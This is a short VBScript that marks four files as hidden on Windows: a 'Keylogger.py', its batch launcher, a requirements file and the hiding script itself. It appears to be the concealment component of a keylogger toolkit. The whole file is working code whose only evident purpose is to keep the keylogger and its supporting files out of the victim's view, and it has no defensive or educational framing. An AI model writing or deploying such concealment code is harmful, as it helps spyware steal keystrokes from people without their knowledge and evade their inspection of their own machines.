Option Explicit

' List of files to hide
Dim filesToHide
filesToHide = Array("Keylogger.py","LauncherForWindows.bat","requirements.txt","file_hider.vbs")

' Loop through the files and make them hidden
Dim file
For Each file In filesToHide
    HideFile file
Next

Sub HideFile(filePath)
    Dim fso, fileObj
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' Check if the file exists
    If fso.FileExists(filePath) Then
        ' Get the file attributes and set the hidden attribute
        Set fileObj = fso.GetFile(filePath)
        fileObj.Attributes = fileObj.Attributes + 2
    End If
    
    Set fileObj = Nothing
    Set fso = Nothing
End Sub
